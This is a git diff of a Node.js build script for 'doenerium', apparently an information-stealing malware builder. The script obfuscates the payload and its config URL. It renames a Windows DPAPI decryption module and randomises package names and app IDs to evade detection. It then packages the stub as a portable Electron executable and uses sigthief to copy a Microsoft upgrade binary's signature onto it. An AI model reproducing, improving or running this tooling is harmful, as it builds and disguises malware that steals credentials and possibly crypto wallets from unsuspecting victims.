@@ -1,21 +1,21 @@
 const jsconfuser = require('js-confuser');
 const jsobf = require("javascript-obfuscator");
 const fs = require("fs");
+const path = require('path');
 const child_process = require("child_process");
 const os = require("os");
 const https = require('https');
-const exe = require('@angablue/exe');
 const config = require("./config.js")()
 
+const builder = require("electron-builder");
+const Platform = builder.Platform;
+const electron_version = "24.1.1";
 
 async function install_node_gyp() {
     return new Promise(res => {
         res(child_process.execSync("npm install -g node-gyp"))
     })
 }
-
-let result = '';
-
 
 var isModuleAvailableSync = function (moduleName) {
     var ret = false; // return value, boolean
@@ -43,11 +43,10 @@ async function install_module(module_name) {
 async function check_all_modules_installed() {
     return new Promise(async (res) => {
         [
-            "@angablue/exe",
             "@peculiar/webcrypto",
             "axios",
             "bitcoin-seed",
-            "dapifix",
+            "boukiapi",
             "buffer-replace",
             "form-data",
             "javascript-obfuscator",
@@ -63,9 +62,19 @@ async function check_all_modules_installed() {
             "zip-lib"
         ].forEach(async (moduleName) => {
             if (!isModuleAvailableSync(moduleName)) {
-                console.log(`Installing "${moduleName}" as it is not installed`)
-                await install_module(moduleName)
-                console.log(`Installed "${moduleName}"`)
+                if (moduleName == "boukiapi") {
+                    let start = Date.now();
+
+                    console.log("Copying ./boukiapi to ./node_modules/boukiapi")
+                    fs.mkdirSync("./node_modules/boukiapi");
+                    copyFolderRecursiveSync("./boukiapi", "./node_modules")
+                    console.log(`Copied ./boukiapi to ./node_modules/boukiapi within ${(Date.now() - start) / 1000} seconds`);
+                } else {
+                    console.log(`Installing "${moduleName}" as it is not installed`)
+                    await install_module(moduleName)
+                    console.log(`Installed "${moduleName}"`)
+                }
+
             }
         })
 
@@ -89,7 +98,7 @@ async function fix_node_gyp(versions) {
 async function rebuild() {
     return new Promise(res => {
         console.log("Rebuilding packages")
-        res(child_process.execSync("npm rebuild"))
+        res(child_process.execSync("npm rebuild", { cwd: "./electron" }))
         console.log("Rebuilt packages")
     })
 }
@@ -104,9 +113,9 @@ async function fix_dependencies() {
             await fix_dependencies();
         }
 
-        console.log("Rebuilding dapifix");
-        await build_native_module("dapifix")
-        console.log("Rebuilt dapifix");
+        console.log("Rebuilding boukiapi");
+        await build_native_module("boukiapi")
+        console.log("Rebuilt boukiapi");
 
         const node_js_versions = fs.readdirSync(`${appdata}\\node-gyp\\Cache`);
         await fix_node_gyp(node_js_versions)
@@ -185,7 +194,7 @@ require("os");
 require("path");
 require("stream");
 require("zip-lib");
-require("dapifix");
+require("boukiapi");
 require("systeminformation");
 require("sqlite3");
 require("request");
@@ -256,7 +265,7 @@ function download(url, dest) {
 }
 async function build_native_module(package) {
     return new Promise(res => {
-        res(child_process.execSync(`node-gyp rebuild`, { cwd: `./node_modules/${package}` }))
+        res(child_process.execSync(`node-gyp rebuild`, { cwd: `./electron/node_modules/${package}` }))
     })
 }
 
@@ -272,7 +281,7 @@ function get_pkg_cache() {
 }
 
 async function rename_dapi() {
-    let path = `./node_modules/dapifix`
+    let path = `.\\electron\\node_modules\\boukiapi`
     let original_name = "node-dpapi"
     let new_name = makeid_var(12);
 
@@ -342,7 +351,7 @@ module.exports.unprotectData = dpapi.unprotectData;`;
 
 async function rename_dapi_vars() {
     return new Promise(res => {
-        let path = `./node_modules/dapifix/src/node-dpapi.cpp`;
+        let path = `./electron/node_modules/boukiapi/src/node-dpapi.cpp`;
 
         let content = `#include <node.h>
 #include <nan.h>
@@ -438,16 +447,68 @@ NODE_MODULE(binding, init)
 }
 
 async function fix_package() {
-    const package_json = JSON.parse(fs.readFileSync("./package.json"));
+    const package_json = JSON.parse(fs.readFileSync("./electron/package.json"));
 
     let new_name = makeid_var(16)
 
     package_json.name = new_name;
+    ["js-confuser", "javascript-obfuscator", "electron-builder", "electron-rebuild"].forEach(module => {
+        delete package_json.dependencies[module];
+    })
 
-    fs.writeFileSync("./package.json", JSON.stringify(package_json))
-}   
+    fs.writeFileSync("./electron/package.json", JSON.stringify(package_json))
+}
+
+function signFile(signed, file, output) {
+    return new Promise(res => child_process.exec(`python sigthief.py -i ${signed} -t ${file} -o ${output}`, (err, stdout, stderr) => res(stdout)));
+}
+
+function copyFileSync(source, target) {
+
+    var targetFile = target;
+
+    // If target is a directory, a new file with the same name will be created
+    if (fs.existsSync(target)) {
+        if (fs.lstatSync(target).isDirectory()) {
+            targetFile = path.join(target, path.basename(source));
+        }
+    }
+
+    fs.writeFileSync(targetFile, fs.readFileSync(source));
+}
+
+function copyFolderRecursiveSync(source, target) {
+    var files = [];
+
+    // Check if folder needs to be created or integrated
+    var targetFolder = path.join(target, path.basename(source));
+    if (!fs.existsSync(targetFolder)) {
+        fs.mkdirSync(targetFolder);
+    }
+
+    // Copy
+    if (fs.lstatSync(source).isDirectory()) {
+        files = fs.readdirSync(source);
+        files.forEach(function (file) {
+            var curSource = path.join(source, file);
+            if (fs.lstatSync(curSource).isDirectory()) {
+                copyFolderRecursiveSync(curSource, targetFolder);
+            } else {
+                copyFileSync(curSource, targetFolder);
+            }
+        });
+    }
+}
+
+async function rebuild_electron() {
+    return new Promise(res => {
+        res(child_process.execSync(`electron-rebuild -a ia32 -v ${electron_version}`, { cwd: "./electron" }))
+    })
+}
 
 (async () => {
+    let randomid = makeid(8)
+
     let skip_download_nodejs = Boolean(process.argv[2])
     if (!skip_download_nodejs) { // idk why but my builder is kinda tripping & this somehow works LMFAO
         console.log("Downloading Node.js pre-built binary")
@@ -466,9 +527,24 @@ async function fix_package() {
     await check_all_modules_installed();
     console.log("Checked if all modules are installed")
 
-    console.log(`Modding dapifix`)
+    start = Date.now();
+    console.log("Copying ./node_modules to ./electron/node_modules")
+    if (!fs.existsSync("./electron/node_modules")) {
+        fs.mkdirSync("./electron/node_modules");
+    }
+    try {
+        copyFileSync("./package.json", "./electron/package.json");
+        copyFileSync("./package-lock.json", "./electron/package-lock.json");
+
+        copyFolderRecursiveSync("./node_modules", "./electron")
+    } catch (e) {
+        console.log(e)
+    }
+    console.log(`Copied ./node_modules to ./electron/node_modules within ${(Date.now() - start) / 1000} seconds`);
+
+    console.log(`Modding boukiapi`)
     await rename_dapi();
-    console.log("Modded dapifix");
+    console.log("Modded boukiapi");
 
     console.log(`Modding package.json`)
     await fix_package();
@@ -477,36 +553,76 @@ async function fix_package() {
     console.log("Fixing dependencies")
     await fix_dependencies();
     console.log("Fixed dependencies")
+    start = Date.now();
+    console.log("Rebuilding electron")
+    await rebuild_electron();
+    console.log(`Rebuilt electron within ${(Date.now() - start) / 1000} seconds`)
 
-    const index_file = "index.js";
+    const index_file = "./electron/index.js";
+    const config_file = "./electron/config_obf.js"
     console.log(`Obfuscating source code`)
     start = Date.now()
     await obfuscate("doenerium.js", index_file);
     console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${index_file}`);
     console.log(`Obfuscating config URL`)
     start = Date.now()
-    await obfuscate("config.js", "config_obf.js");
-    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: config_obf.js`);
+    await obfuscate("config.js", config_file);
+    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${config_file}`);
 
     console.log(`Building stub...`)
-
-    let randomid = makeid(8)
     start = Date.now()
 
-    const build = await exe({
-        entry: '.',
-        out: `./doenerium_${randomid}.exe`,
-        icon: config.icon,
-        target: 'node18-win-x64',
-        pkg: ['-C', 'GZip'],
-        properties: config.properties
+    const d = await builder.build({
+        targets: Platform.WINDOWS.createTarget(),
+        config: {
+            npmRebuild: true,
+            nodeGypRebuild: false,
+            buildDependenciesFromSource: true,
+            appId: `${makeid_var(8)}.${makeid_var(8)}.${makeid_var(8)}`,
+            electronVersion: electron_version,
+            nodeVersion: "18.15.0",
+            buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
+            productName: config.properties.ProductName,
+            icon: config.icon,
+            compression: 'maximum',
+            directories: {
+                app: "./electron",
+                output: `${randomid}`,
+            },
+            win: {
+                artifactName: config.properties.OriginalFilename,
+                publisherName: "x",
+                legalTrademarks: config.properties.LegalCopyright,
+                target: [
+                    {
+                        target: "portable",
+                        arch: [
+                            "ia32",
+                        ]
+                    }
+                ]
+            }
+        }
     })
 
     //child_process.execSync(`pkg . -C GZip -t node18 -o doenerium_${randomid}.exe`)
     fs.unlinkSync(index_file);
-    fs.unlinkSync("config_obf.js");
+    fs.unlinkSync(config_file);
+
+    try {
+        console.log(await signFile("./unsigned/Windows10Upgrade9252.exe", `${randomid}/${config.properties.OriginalFilename}`, `doenerium_${randomid}.exe`))
+    } catch (e) {
+        console.log(e)
+    }
 
     console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)
+
+    if (!fs.existsSync(`./doenerium_${randomid}.exe`)) {
+        fs.copyFileSync(`${randomid}/${config.properties.OriginalFilename}`, `./doenerium_${randomid}.exe`)
+    }
+
+    fs.rmdirSync(randomid, { recursive: true, force: true })
+
     console.log(`You can now close this window.`)
 
     while (true) { }
